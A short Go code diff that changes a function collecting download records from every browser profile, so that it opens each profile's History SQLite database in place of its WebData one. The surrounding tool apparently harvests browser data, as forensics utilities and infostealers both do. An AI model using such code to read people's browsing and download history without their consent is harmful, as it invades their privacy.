@@ -15,7 +15,7 @@ func Get(browsersList []structs.Browser) string {
 	var downloads []Downloads
 	for _, browser := range browsersList {
 		for _, profile := range browser.Profiles {
-			path := profile.WebData
+			path := profile.History
 
 			db, err := sql.Open("sqlite3", path)
 			if err != nil {
